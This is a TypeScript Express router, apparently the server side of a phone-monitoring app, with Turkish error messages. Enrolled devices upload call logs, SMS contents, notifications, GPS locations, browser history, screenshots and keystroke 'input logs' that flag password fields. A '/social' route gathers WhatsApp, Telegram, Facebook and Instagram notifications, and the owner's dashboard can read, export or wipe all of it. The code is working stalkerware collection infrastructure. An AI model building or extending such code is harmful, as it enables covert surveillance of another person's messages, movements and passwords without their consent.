import { Router } from 'express';
import { z } from 'zod';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { prisma } from '../lib/prisma';
import { requireDevice, requireAuth, AuthRequest } from '../middleware/auth';

const router = Router();

const uploadsDir = path.join(__dirname, '../../uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadsDir),
  filename: (_req, file, cb) => {
    const unique = `${Date.now()}-${Math.random().toString(36).slice(2)}${path.extname(file.originalname) || '.jpg'}`;
    cb(null, unique);
  },
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

async function verifyDeviceOwnership(deviceId: string, userId: string, role: string) {
  const device = await prisma.device.findUnique({ where: { id: deviceId } });
  if (!device) return null;
  if (role !== 'admin' && device.userId !== userId) return null;
  return device;
}

const callSchema = z.object({
  calls: z.array(z.object({
    number: z.string(),
    contactName: z.string().optional(),
    type: z.enum(['INCOMING', 'OUTGOING', 'MISSED']),
    durationSeconds: z.number().int().default(0),
    timestamp: z.string().datetime(),
  })),
});

const smsSchema = z.object({
  messages: z.array(z.object({
    address: z.string(),
    body: z.string(),
    type: z.string(),
    timestamp: z.string().datetime(),
  })),
});

const notificationSchema = z.object({
  notifications: z.array(z.object({
    appPackage: z.string(),
    appName: z.string().optional(),
    title: z.string().optional(),
    text: z.string().optional(),
    timestamp: z.string().datetime(),
  })),
});

const locationSchema = z.object({
  locations: z.array(z.object({
    latitude: z.number(),
    longitude: z.number(),
    accuracy: z.number().optional(),
    timestamp: z.string().datetime(),
  })),
});

const appUsageSchema = z.object({
  usages: z.array(z.object({
    packageName: z.string(),
    appName: z.string().optional(),
    usageMinutes: z.number().int(),
    date: z.string(),
  })),
});

const webHistorySchema = z.object({
  entries: z.array(z.object({
    url: z.string(),
    title: z.string().optional(),
    browserPackage: z.string(),
    browserName: z.string().optional(),
    timestamp: z.string().datetime(),
  })),
});

const inputLogSchema = z.object({
  entries: z.array(z.object({
    appPackage: z.string(),
    appName: z.string().optional(),
    fieldName: z.string().optional(),
    text: z.string(),
    isPasswordField: z.boolean().optional(),
    timestamp: z.string().datetime(),
  })),
});

router.post('/calls', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { calls } = callSchema.parse(req.body);
    await prisma.callLog.createMany({
      data: calls.map((c) => ({
        deviceId: req.deviceId!,
        number: c.number,
        contactName: c.contactName,
        type: c.type,
        durationSeconds: c.durationSeconds,
        timestamp: new Date(c.timestamp),
      })),
    });
    res.json({ ok: true, count: calls.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/sms', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { messages } = smsSchema.parse(req.body);
    await prisma.smsMessage.createMany({
      data: messages.map((m) => ({
        deviceId: req.deviceId!,
        address: m.address,
        body: m.body,
        type: m.type,
        timestamp: new Date(m.timestamp),
      })),
    });
    res.json({ ok: true, count: messages.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/notifications', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { notifications } = notificationSchema.parse(req.body);
    await prisma.notification.createMany({
      data: notifications.map((n) => ({
        deviceId: req.deviceId!,
        appPackage: n.appPackage,
        appName: n.appName,
        title: n.title,
        text: n.text,
        timestamp: new Date(n.timestamp),
      })),
    });
    res.json({ ok: true, count: notifications.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/locations', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { locations } = locationSchema.parse(req.body);
    await prisma.location.createMany({
      data: locations.map((l) => ({
        deviceId: req.deviceId!,
        latitude: l.latitude,
        longitude: l.longitude,
        accuracy: l.accuracy,
        timestamp: new Date(l.timestamp),
      })),
    });
    res.json({ ok: true, count: locations.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/app-usage', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { usages } = appUsageSchema.parse(req.body);
    for (const u of usages) {
      await prisma.appUsage.upsert({
        where: {
          deviceId_packageName_date: {
            deviceId: req.deviceId!,
            packageName: u.packageName,
            date: new Date(u.date),
          },
        },
        create: {
          deviceId: req.deviceId!,
          packageName: u.packageName,
          appName: u.appName,
          usageMinutes: u.usageMinutes,
          date: new Date(u.date),
        },
        update: { usageMinutes: u.usageMinutes, appName: u.appName },
      });
    }
    res.json({ ok: true, count: usages.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/web-history', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { entries } = webHistorySchema.parse(req.body);
    await prisma.webHistory.createMany({
      data: entries.map((e) => ({
        deviceId: req.deviceId!,
        url: e.url,
        title: e.title,
        browserPackage: e.browserPackage,
        browserName: e.browserName,
        timestamp: new Date(e.timestamp),
      })),
    });
    res.json({ ok: true, count: entries.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/input-logs', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { entries } = inputLogSchema.parse(req.body);
    await prisma.inputLog.createMany({
      data: entries.map((e) => ({
        deviceId: req.deviceId!,
        appPackage: e.appPackage,
        appName: e.appName,
        fieldName: e.fieldName,
        text: e.text,
        isPasswordField: e.isPasswordField ?? false,
        timestamp: new Date(e.timestamp),
      })),
    });
    res.json({ ok: true, count: entries.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('POST /data error:', e);
    res.status(500).json({ error: 'Veri kaydı başarısız' });
  }
});

router.post('/media', requireDevice, upload.single('file'), async (req: AuthRequest, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: 'Dosya gerekli' });
    const type = (req.body.type as string) || 'screenshot';
    const timestamp = req.body.timestamp ? new Date(req.body.timestamp) : new Date();
    const fileUrl = `/uploads/${req.file.filename}`;
    const record = await prisma.mediaCapture.create({
      data: {
        deviceId: req.deviceId!,
        type,
        fileUrl,
        timestamp,
      },
    });
    res.json({ ok: true, id: record.id, fileUrl });
  } catch {
    res.status(500).json({ error: 'Medya yükleme başarısız' });
  }
});

router.get('/calls/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const calls = await prisma.callLog.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 200,
  });
  res.json(calls);
});

router.get('/sms/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const messages = await prisma.smsMessage.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 200,
  });
  res.json(messages);
});

router.get('/notifications/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const notifications = await prisma.notification.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 200,
  });
  res.json(notifications);
});

router.get('/locations/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const locations = await prisma.location.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 100,
  });
  res.json(locations);
});

router.get('/app-usage/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const usages = await prisma.appUsage.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { date: 'desc' },
    take: 100,
  });
  res.json(usages);
});

router.get('/web-history/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const entries = await prisma.webHistory.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 300,
  });
  res.json(entries);
});

router.get('/input-logs/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const entries = await prisma.inputLog.findMany({
    where: { deviceId: req.params.deviceId },
    orderBy: { timestamp: 'desc' },
    take: 300,
  });
  res.json(entries);
});

router.get('/media/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const type = req.query.type as string | undefined;
  const media = await prisma.mediaCapture.findMany({
    where: { deviceId: req.params.deviceId, ...(type ? { type } : {}) },
    orderBy: { timestamp: 'desc' },
    take: 100,
  });
  res.json(media);
});

const installedAppsSchema = z.object({
  apps: z.array(z.object({
    packageName: z.string(),
    appName: z.string().optional(),
    versionName: z.string().optional(),
    action: z.enum(['installed', 'removed', 'snapshot']),
    timestamp: z.string().datetime(),
  })),
});

router.post('/installed-apps', requireDevice, async (req: AuthRequest, res) => {
  try {
    const { apps } = installedAppsSchema.parse(req.body);
    for (const app of apps) {
      if (app.action === 'removed') {
        await prisma.installedApp.upsert({
          where: { deviceId_packageName: { deviceId: req.deviceId!, packageName: app.packageName } },
          update: { isInstalled: false, updatedAt: new Date() },
          create: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName || app.packageName, isInstalled: false },
        });
      } else {
        await prisma.installedApp.upsert({
          where: { deviceId_packageName: { deviceId: req.deviceId!, packageName: app.packageName } },
          update: { appName: app.appName || app.packageName, versionName: app.versionName, isInstalled: true, updatedAt: new Date() },
          create: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName || app.packageName, versionName: app.versionName, isInstalled: true },
        });
      }
      if (app.action !== 'snapshot') {
        await prisma.appChangeLog.create({
          data: { deviceId: req.deviceId!, packageName: app.packageName, appName: app.appName, action: app.action, recordedAt: new Date(app.timestamp) },
        });
      }
    }
    res.json({ ok: true, count: apps.length });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error('installed-apps error:', e);
    res.status(500).json({ error: 'Uygulama kaydı başarısız' });
  }
});

router.get('/installed-apps/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const [apps, changes] = await Promise.all([
    prisma.installedApp.findMany({ where: { deviceId: req.params.deviceId }, orderBy: { appName: 'asc' } }),
    prisma.appChangeLog.findMany({ where: { deviceId: req.params.deviceId }, orderBy: { recordedAt: 'desc' }, take: 100 }),
  ]);
  res.json({ apps, changes });
});

router.get('/social/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const socialPackages = ['com.whatsapp', 'com.whatsapp.w4b', 'org.telegram.messenger', 'com.facebook.katana', 'com.facebook.orca', 'com.instagram.android'];
  const notifications = await prisma.notification.findMany({
    where: { deviceId: req.params.deviceId, appPackage: { in: socialPackages } },
    orderBy: { timestamp: 'desc' },
    take: 500,
  });
  res.json(notifications);
});

type DataType = 'calls' | 'sms' | 'notifications' | 'locations' | 'web-history' | 'input-logs' | 'media' | 'installed-apps';

router.delete('/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const type = req.params.type as DataType | 'all';
  const deviceId = req.params.deviceId;

  try {
    if (type === 'all') {
      await Promise.all([
        prisma.callLog.deleteMany({ where: { deviceId } }),
        prisma.smsMessage.deleteMany({ where: { deviceId } }),
        prisma.notification.deleteMany({ where: { deviceId } }),
        prisma.location.deleteMany({ where: { deviceId } }),
        prisma.webHistory.deleteMany({ where: { deviceId } }),
        prisma.inputLog.deleteMany({ where: { deviceId } }),
        prisma.mediaCapture.deleteMany({ where: { deviceId } }),
        prisma.appChangeLog.deleteMany({ where: { deviceId } }),
        prisma.installedApp.deleteMany({ where: { deviceId } }),
      ]);
      return res.json({ ok: true, message: 'Tüm veriler silindi' });
    }
    const map: Record<string, () => Promise<unknown>> = {
      calls: () => prisma.callLog.deleteMany({ where: { deviceId } }),
      sms: () => prisma.smsMessage.deleteMany({ where: { deviceId } }),
      notifications: () => prisma.notification.deleteMany({ where: { deviceId } }),
      locations: () => prisma.location.deleteMany({ where: { deviceId } }),
      'web-history': () => prisma.webHistory.deleteMany({ where: { deviceId } }),
      'input-logs': () => prisma.inputLog.deleteMany({ where: { deviceId } }),
      media: () => prisma.mediaCapture.deleteMany({ where: { deviceId } }),
      'installed-apps': () => Promise.all([
        prisma.installedApp.deleteMany({ where: { deviceId } }),
        prisma.appChangeLog.deleteMany({ where: { deviceId } }),
      ]),
    };
    const fn = map[type];
    if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
    await fn();
    res.json({ ok: true });
  } catch (e) {
    console.error('delete error:', e);
    res.status(500).json({ error: 'Silme başarısız' });
  }
});

router.get('/export/:type/:deviceId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceOwnership(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(403).json({ error: 'Erişim reddedildi' });
  const type = req.params.type as DataType | 'all';
  const deviceId = req.params.deviceId;

  try {
    let data: unknown;
    if (type === 'all') {
      data = {
        calls: await prisma.callLog.findMany({ where: { deviceId } }),
        sms: await prisma.smsMessage.findMany({ where: { deviceId } }),
        notifications: await prisma.notification.findMany({ where: { deviceId } }),
        locations: await prisma.location.findMany({ where: { deviceId } }),
        webHistory: await prisma.webHistory.findMany({ where: { deviceId } }),
        inputLogs: await prisma.inputLog.findMany({ where: { deviceId } }),
        media: await prisma.mediaCapture.findMany({ where: { deviceId } }),
        installedApps: await prisma.installedApp.findMany({ where: { deviceId } }),
        appChanges: await prisma.appChangeLog.findMany({ where: { deviceId } }),
      };
    } else {
      const map: Record<string, () => Promise<unknown>> = {
        calls: () => prisma.callLog.findMany({ where: { deviceId } }),
        sms: () => prisma.smsMessage.findMany({ where: { deviceId } }),
        notifications: () => prisma.notification.findMany({ where: { deviceId } }),
        locations: () => prisma.location.findMany({ where: { deviceId } }),
        'web-history': () => prisma.webHistory.findMany({ where: { deviceId } }),
        'input-logs': () => prisma.inputLog.findMany({ where: { deviceId } }),
        media: () => prisma.mediaCapture.findMany({ where: { deviceId } }),
        'installed-apps': () => prisma.installedApp.findMany({ where: { deviceId } }),
      };
      const fn = map[type];
      if (!fn) return res.status(400).json({ error: 'Geçersiz veri tipi' });
      data = await fn();
    }
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${type}-${deviceId}.json"`);
    res.send(JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('export error:', e);
    res.status(500).json({ error: 'Dışa aktarma başarısız' });
  }
});

export default router;
